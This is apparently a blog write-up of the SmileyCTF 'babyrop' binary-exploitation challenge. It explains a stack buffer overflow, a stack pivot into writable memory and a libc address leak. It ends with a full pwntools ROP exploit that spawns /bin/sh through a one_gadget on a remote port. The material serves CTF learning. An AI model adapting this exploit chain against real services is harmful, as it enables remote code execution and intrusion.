---
title: "SmileyCTF Babyrop-1"
date: 2025-07-17 00:00:00 +0000
layout: post
categories: [CTF, Writeup]
tags: [smileyctf, pwn, rop, return-oriented-programming, linux-binary-exploitation, binary-exploitation, buffer-overflow, stack-based-buffer-overflow, python, c, pwntools, gef]
description: "Reverse engineering and solving the SmileyCTF Babyrop challenge binary. Includes libc leak, Stack pivot and ROP."
image: "/assets/images/go-crackme.png"
---

## The Challenge

Upon installing the binary, the challenge creators provided several files:

Docker files to reproduce the remote challenge environment.

A shared library file (libc.so.6).

A vulnerable application named vuln.

A dummy flag.txt.


```bash
┌──(root㉿kali2025)-[~/…/CTF/SmileyCTF/eth007/babyrop]
└─# ls -al
total 2124
drwxr-xr-x 2 1001 postgres    4096 Jun 15 17:00 .
drwxr-xr-x 3 root root        4096 Jul 16 05:38 ..
-rw-r--r-- 1 1001 postgres      97 Jun 15 17:00 docker-compose.yml
-rw-r--r-- 1 1001 postgres    1164 Jun 15 17:00 Dockerfile
-rw-r--r-- 1 1001 postgres      29 Jun 15 17:00 flag.txt
-rwxr-xr-x 1 1001 postgres 2125328 Jun 15 17:00 libc.so.6
-rw-r--r-- 1 1001 postgres      74 Jun 15 17:00 Makefile
-rw-r--r-- 1 1001 postgres    1217 Jun 15 17:00 nsjail.cfg
-rw-r--r-- 1 1001 postgres      59 Jun 15 17:00 run.sh
-rwxr-xr-x 1 1001 postgres   16048 Jun 15 17:00 vuln
```
Let's quickly inspect libc.so.6. It's stripped and has all protections enabled.


```bash

root@b474638f7398:/host# file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=42c84c92e6f98126b3e2230ebfdead22c235b667, for GNU/Linux 3.2.0, stripped
root@b474638f7398:/host# checksec libc.so.6
[*] '/host/libc.so.6'
    Arch:      amd64-64-little
    RELRO:     Full RELRO
    Stack:     Canary found
    NX:        NX enabled
    PIE:       PIE enabled
    FORTIFY:   Enabled
    SHSTK:     Enabled
    IBT:       Enabled
```

The challenge binary, vuln, has Full RELRO and NX enabled, but no stack canary and PIE is disabled. Being unstripped will simplify debugging.


```bash
root@b474638f7398:/host# checksec vuln
[*] '/host/vuln'
    Arch:      amd64-64-little
    RELRO:     Full RELRO
    Stack:     No canary found
    NX:        NX enabled
    PIE:       No PIE (0x400000)
    SHSTK:     Enabled
    IBT:       Enabled
    Stripped:  No
root@b474638f7398:/host# file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd756860c1c9ffe7287a887c8792773c4c4b4e13, for GNU/Linux 3.2.0, not stripped
```

Let's examine the symbols. I've highlighted some interesting lines from the symbols:


```bash
readelf -s ./vuln
Most symbols are standard, except for the gadgets function. Given the challenge name, babyrop, these are likely provided by the challenge creators to assist us in building a ROP chain.

Noted here as a reminder:

objdump -d ./vuln -M intel

...
0000000000401176 <gadgets>:
  401176:        f3 0f 1e fa              endbr64
  40117a:        55                       push   rbp
  40117b:        48 89 e5                 mov    rbp,rsp
  40117e:        59                       pop    rcx
  40117f:        c3                       ret
  401180:        90                       nop
  401181:        5d                       pop    rbp
  401182:        c3                       ret
...
A custom gets function is also defined:


0000000000401183 <gets>:
  401183:        f3 0f 1e fa              endbr64
  401187:        55                       push   rbp
  401188:        48 89 e5                 mov    rbp,rsp
  40118b:        48 83 ec 20              sub    rsp,0x20
  40118f:        48 89 7d e8              mov    QWORD PTR [rbp-0x18],rdi
  401193:        48 8b 45 e8              mov    rax,QWORD PTR [rbp-0x18]
  401197:        ba bc 02 00 00           mov    edx,0x2bc
  40119c:        48 89 c6                 mov    rsi,rax
  40119f:        bf 00 00 00 00           mov    edi,0x0
  4011a4:        b8 00 00 00 00           mov    eax,0x0
  4011a9:        e8 d2 fe ff ff           call   401080 <read@plt>
  4011ae:        89 45 fc                 mov    DWORD PTR [rbp-0x4],eax
  4011b1:        83 7d fc 00              cmp    DWORD PTR [rbp-0x4],0x0
  4011b5:        7e 13                    jle    4011ca <gets+0x47>
  4011b7:        8b 45 fc                 mov    eax,DWORD PTR [rbp-0x4]
  4011ba:        48 98                    cdqe
  4011bc:        48 8d 50 ff              lea    rdx,[rax-0x1]
  4011c0:        48 8b 45 e8              mov    rax,QWORD PTR [rbp-0x18]
  4011c4:        48 01 d0                 add    rax,rdx
  4011c7:        c6 00 00                 mov    BYTE PTR [rax],0x0
  4011ca:        8b 45 fc                 mov    eax,DWORD PTR [rbp-0x4]
  4011cd:        c9                       leave
  4011ce:        c3                       ret
```

The challenge binary's logic is straightforward: it takes user input and then prints it back. The buffer length is not properly controlled, leading to a stack-based buffer overflow.

```bash
root@30ee3317d43a:/host# ./vuln
AAAAAAAA
AAAAAAAA
root@30ee3317d43a:/host# ./vuln
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

### Taking control of RIP

I set a breakpoint at `*main+88` and then created an 80-byte pattern.

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004011cf <+0>:     endbr64
   0x00000000004011d3 <+4>:     push   rbp
   0x00000000004011d4 <+5>:     mov    rbp,rsp
   0x00000000004011d7 <+8>:     sub    rsp,0x20
   0x00000000004011db <+12>:    mov    rax,QWORD PTR [rip+0x2e36]        # 0x404018 <stdout@GLIBC_2.2.5>
   0x00000000004011e2 <+19>:    mov    esi,0x0
   0x00000000004011e7 <+24>:    mov    rdi,rax
   0x00000000004011ea <+27>:    call   0x401060 <setbuf@plt>
   0x00000000004011ef <+32>:    lea    rax,[rbp-0x20]
   0x00000000004011f3 <+36>:    mov    edx,0x20
   0x00000000004011f8 <+41>:    mov    esi,0x0
   0x00000000004011fd <+46>:    mov    rdi,rax
   0x0000000000401200 <+49>:    call   0x401070 <memset@plt>
   0x0000000000401205 <+54>:    lea    rax,[rbp-0x20]
   0x0000000000401209 <+58>:    mov    rdi,rax
   0x000000000040120c <+61>:    call   0x401183 <gets>
   0x0000000000401211 <+66>:    mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>
   0x0000000000401218 <+73>:    lea    rax,[rbp-0x20]
   0x000000000040121c <+77>:    mov    rdi,rax
   0x000000000040121f <+80>:    call   rdx
   0x0000000000401221 <+82>:    mov    eax,0x0
   0x0000000000401226 <+87>:    leave
=> 0x0000000000401227 <+88>:    ret
End of assembler dump.
gef➤  pattern create 80
[+] Generating a pattern of 80 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
[+] Saved as '$_gef1'
gef➤  

```

Running the binary and providing the pattern string revealed an offset of 40 bytes. This means that after 40 bytes, the next 8 bytes will overwrite the RIP register.

![Pasted image 20250716062356](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716062356.png)

### Creating basic exploit script

To run the Docker container, it exposes port 42123.
```bash
docker-compose -f docker-compose.yml up
```


`pwntools` offers excellent features, and one of my favorites is its exploit template generation. Here's how I generated the template:


```bash
root@30ee3317d43a:/host# pwn template --host=127.0.0.1 --port=42123 --libc=./libc.so.6 --quiet ./vuln |tee exploit.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './vuln')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 42123)

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.interactive()

```

Here are the changes I made to the `exploit.py` script. If you're new to this area, these modifications might be particularly helpful.

To send a payload and debug simultaneously, you need to set context.terminal. I use `tmux` for this.

I set a breakpoint at `main+88`, which is the end of the main function. Another pwntools feature I appreciate is the `flat` method. We're simply telling it to send `0x4141414142424242` after 40 bytes. 

```python
context.terminal = ['tmux', 'splitw', '-v']

...
...
...
gdbscript = '''
tbreak main
tbreak *main+88
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()



payload = flat({
    40:[
        0x4141414142424242
      ]
    })

io.sendline(payload)

```

After executing `exploit.py`, the `RIP register` was successfully overwritten with `0x4141414142424242`.

![Pasted image 20250716065717](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716065717.png)


### The exploit strategy

Reaching this point was relatively easy; the real challenge begins now. Since we can overwrite RIP but cannot execute code on the stack due to NX protection, we need to leak the libc address at runtime.

The first thing I did was recall the print function from the binary. As you can see below, the print function behaves differently from setbuf or memset.

It's also worth mentioning that the print function is safe from format-string vulnerabilities.  

![Pasted image 20250716071941](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716071941.png)


```python
gef➤  x/32xg 0x404000
0x404000:       0x0000000000000000      0x0000000000000000
0x404010 <print>:       0x00007ffff7e2bbe0      0x00007ffff7fa85c0
0x404020 <completed.0>: 0x0000000000000000      0x0000000000000000
0x404030:       0x0000000000000000      0x0000000000000000
0x404040:       0x0000000000000000      0x0000000000000000
0x404050:       0x0000000000000000      0x0000000000000000
0x404060:       0x0000000000000000      0x0000000000000000
0x404070:       0x0000000000000000      0x0000000000000000
0x404080:       0x0000000000000000      0x0000000000000000
0x404090:       0x0000000000000000      0x0000000000000000
0x4040a0:       0x0000000000000000      0x0000000000000000
0x4040b0:       0x0000000000000000      0x0000000000000000
0x4040c0:       0x0000000000000000      0x0000000000000000
0x4040d0:       0x0000000000000000      0x0000000000000000
0x4040e0:       0x0000000000000000      0x0000000000000000
0x4040f0:       0x0000000000000000      0x0000000000000000

gef➤  got
──────────────────────────────────────────────────────────────────────────────────────── /host/vuln ────────────────────────────────────────────────────────────────────────────────────────

GOT protection: Full RelRO | GOT functions: 3
 
[0x403fd8] setbuf@GLIBC_2.2.5  →  0x7ffff7e33750
[0x403fe0] memset@GLIBC_2.2.5  →  0x7ffff7f2d400
[0x403fe8] read@GLIBC_2.2.5  →  0x7ffff7ebfa50
gef➤  

```

However, there's a trick here: while the GOT table is read-only, the print function is located in a writable memory area.

Since the binary doesn't contain a pop rdi gadget, let's examine how print is called in main.

![Pasted image 20250716072957](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716072957.png)

Since the binary doesn't contain any `pop rdi` gadget. So take a closer look the how `print` called in the `main`.

```python
0x0000000000401211 <+66>:    mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>
0x0000000000401218 <+73>:    lea    rax,[rbp-0x20]
0x000000000040121c <+77>:    mov    rdi,rax
0x000000000040121f <+80>:    call   rdx
```

The parameter value comes from $rbp-0x20. When we run GDB again and set a breakpoint at *main+0x49, $rbp-0x20 points to the start of the input.

![Pasted image 20250716074707](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716074707.png)

### The problem of $rbp

Updated payload

```python
print_addr = 0x404010
print_call = 0x401211

payload = flat({
    0: [
        print_addr
        ],
    40:[
        print_call
      ]
    })

io.sendline(payload)
```

#### Remembering basics

The problem is that when we overwrite RIP, we also overwrite the RBP register.



![[Pasted image 20250716080336](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716080336.png)

The RBP register is located 8 bytes before the RIP register.
The leave instruction performs two operations: `Set RSP to RBP, then pop RBP`

```python
mov rsp, rbp
pop rbp
```

Since overwriting the RBP register with an invalid value prevents correct address referencing, we must set the RBP register to a valid value.



![Pasted image 20250716080308](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716080308.png)



To do this, update the payload with print_addr+0x20. This ensures that the RBP register is correctly set.

The updated payload:

```python
print_addr = 0x404010
print_call = 0x401211

payload = flat({
    0: [
        print_addr
        ],
    32:[
        print_addr+0x20,
        print_call
      ]
    })

io.sendline(payload)
```

The image below shows the successful leak of the print function's address.

![Pasted image 20250716081544](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716081544.png)

However, another problem needs to be resolved: after leaking the print address, execution landed at 0x404038, not the stack. Fortunately, execution landed in a writable memory area. Since we cannot control this address at the moment, we need a workaround.

![Pasted image 20250716081920](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716081920.png)

To overcome this, we must write to that area. Before leaking the print address, we'll prepare a landing area, then leak the address, and then we'll be in business.

To achieve that

>[!Steps]
>Calling gets with buffer area 0x404038
>Call print and leak the address of `print libc addr`
>Calculate the `system`, `/bin/sh` addresses
>We are good to go

First, set RBP. Some useful gadgets are shared below:

```python
root@30ee3317d43a:/host# python3 /tools/ROPgadget/ROPgadget.py --binary vuln --depth 5 --filter 'pop rbp'
Gadgets information
============================================================
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401225 : add cl, cl ; ret
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004011cd : leave ; ret
0x000000000040117c : mov ebp, esp ; pop rcx ; ret
0x000000000040117b : mov rbp, rsp ; pop rcx ; ret
0x0000000000401180 : nop ; pop rbp ; ret
0x00000000004010ef : nop ; ret
0x000000000040115d : pop rbp ; ret
0x000000000040117e : pop rcx ; ret
0x000000000040101a : ret
```

At address `0x40115d` the address of helpfull to set. 

```python
0x40115d
0x404038+0x20
```

The addition of 0x20 is the the gets function parameter also came from `RBP-0x20`

```python
   0x0000000000401205 <+54>:    lea    rax,[rbp-0x20]
   0x0000000000401209 <+58>:    mov    rdi,rax
   0x000000000040120c <+61>:    call   0x401183 <gets>
```

After gets called, a significant amount of buffer can land in the writable area. 

Test the payload.

```python
landing_addr = 0x404038
print_addr   = 0x404010
print_call   = 0x401211
pop_rbp_ret  = 0x40115d
gets_call    = 0x401205

payload = flat({
    40:[
        pop_rbp_ret,
        landing_addr+0x20,
        gets_call
    ]
    })

io.sendline(payload)
```

The screenshot below proves that the RBP register was overwritten with `0x404058`

![Pasted image 20250716090734](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716090734.png)

To avoid losing program control, we must re-overflow the buffer. The screenshot below confirms that address 0x404038 was overwritten with the input buffer.   

![Pasted image 20250716091703](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716091703.png)



The updated payload.

```python

landing_addr = 0x404038
print_addr   = 0x404010
print_call   = 0x401211
pop_rbp_ret  = 0x40115d
gets_call    = 0x401205


## Set rbp to 0x404058
first_stage_payload = flat({
    40:[
        pop_rbp_ret,
        landing_addr+0x20,
        gets_call
    ]
    })

io.sendline(first_stage_payload)

io.recv()


second_stage_payload = flat({
    0: [
        print_addr
        ],
    32:[
        print_addr+0x20,
        print_call,
        0x4141414141414141,
        0x4242424242424242
        ]
    })

io.sendline(second_stage_payload)


## get second output after gets called
print(io.recv())

print("second input out:")
leak = int.from_bytes(io.recv(), 'little')
info(hex(leak))
```

The problem with this payload is that internal calls within the print function attempt to write to lower addresses on the stack. The image below shows _IO_file_xsputn+0xa trying to push 0x404000. When this happens, it continuously goes to lower addresses, which are not writable. The writable area starts from 0x404000.

![Pasted image 20250716095624](/assets/images/SmileyCTF-babyrop/Pasted_image_20250716095624.png)

Therefore, we need to align RSP to a higher address. The stack in the print function should remain within 0x404000 - 0x405000.

The gadget

```python
(vuln/ELF/x86_64)> search add rsp
[INFO] Searching for gadgets: add rsp

[INFO] File: vuln
0x0000000000401016: add rsp, 8; ret;
```


The payload,

```python

landing_addr = 0x404038
print_addr   = 0x404010
print_call   = 0x401211
pop_rbp_ret  = 0x40115d
gets_call    = 0x401205
add_rsp_8    = 0x401016
leave_ret    = 0x4011cd

### Set rbp to 0x404058 ###

first_stage_payload = flat({
    0x28: [
        pop_rbp_ret,
        landing_addr+0x20,
        gets_call
        ]
    })

io.sendline(first_stage_payload)
log.info(f'first stage out: {io.recv()}')

second_stage_payload = flat({
    0: print_addr,
    0x20:[
        print_addr+0x20,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        print_call,
        0x4141414141414141,
        0x4242424242424242,
        ]
    })

io.sendline(second_stage_payload)

log.info(f'second stage out: {io.recvline()}')

libc_puts_addr = u64(io.recvline().strip().ljust(8,b"\x00"))

log.success(f'LIBC LEAKED PUTS ADDR: {hex(libc_puts_addr)}')
```

The execution of this payload,

![Pasted image 20250717003855](/assets/images/SmileyCTF-babyrop/Pasted_image_20250717003855.png)

The problem with this payload is that after successfully leaking the puts address from libc, execution landed at 0x404078. If we re-check the landed area, there are different values than what we put there.

![Pasted image 20250717004134](/assets/images/SmileyCTF-babyrop/Pasted_image_20250717004134.png)

This occurs because print's internal calls overwrite the payload body. To overcome this, RIP should land on a specific value. To properly set the RIP value, we need to manipulate the RSP value to higher addresses.


After some tries, the RIP value successfully landed beginning of the `second_stage_payload` .

![Pasted image 20250717011046](/assets/images/SmileyCTF-babyrop/Pasted_image_20250717011046.png)

The payload shared below,

```python
second_stage_payload = flat({
    0: 0x4949494949494949,
    0x20:[
        print_addr+0x20,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        print_call,
        0x4141414141414141,
        0x4242424242424242,
        ]
    })

io.sendline(second_stage_payload)

log.info(f'second stage out: {io.recvline()}')

libc_puts_addr = u64(io.recvline().strip().ljust(8,b"\x00"))

log.success(f'LIBC LEAKED PUTS ADDR: {hex(libc_puts_addr)}')

```

### Preparing code execution

At this point, the needings is clear, calculate libc base address and than calculate the system, `/bin/sh` address inside of libc. The knowledge of libc_base_address, no longer lack of gadget issue.

one_gadget

```python
root@30ee3317d43a:/host# one_gadget ./libc.so.6
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

Next steps is redirect code execution to this address. To achieve that.
After playing with RBP, finally successfully redirect code execution to execve.

Here is final exploit. 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './vuln')
context.terminal = ['tmux', 'splitw', '-v']

host = args.HOST or '192.168.1.101'
port = int(args.PORT or 42123)

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
tbreak *main+88
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

landing_addr = 0x404038
print_addr   = 0x404010
print_call   = 0x401211
pop_rbp_ret  = 0x40115d
gets_call    = 0x401205
add_rsp_8    = 0x401016
leave_ret    = 0x4011cd

### Set rbp to 0x404058 ###

first_stage_payload = flat({
    0x28: [
        pop_rbp_ret,
        landing_addr+0x20,
        gets_call
        ]
    })

io.sendline(first_stage_payload)
log.info(f'first stage out: {io.recv()}')

second_stage_payload = flat({
    0: [
        pop_rbp_ret,
        landing_addr+0x118,
        leave_ret
        ],
    0x20:[
        print_addr+0x20,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8, #this one last
        add_rsp_8,
        add_rsp_8,
        add_rsp_8,
        add_rsp_8, # success with rop
        print_call,
        #0x4141414141414141,
        exe.sym.main,
        0x4242424242424242,
        ]
    })

io.sendline(second_stage_payload)

log.info(f'second stage out: {io.recvline()}')

libc_puts_addr = u64(io.recvline().strip().ljust(8,b"\x00"))

log.success(f'LIBC LEAKED PUTS ADDR: {hex(libc_puts_addr)}')

libc_base_addr = libc_puts_addr - libc.sym.puts

log.success(f'LIBC BASE ADDR: {hex(libc_base_addr)}')

libc.address = libc_base_addr

one_gadget_offset = 0xef52b

execve_addr = libc_base_addr + one_gadget_offset

final_payload = flat({
    0x28: [
        pop_rbp_ret,
        landing_addr+0x150,
        execve_addr
           ]
    })

io.sendline(final_payload)


io.interactive()
```

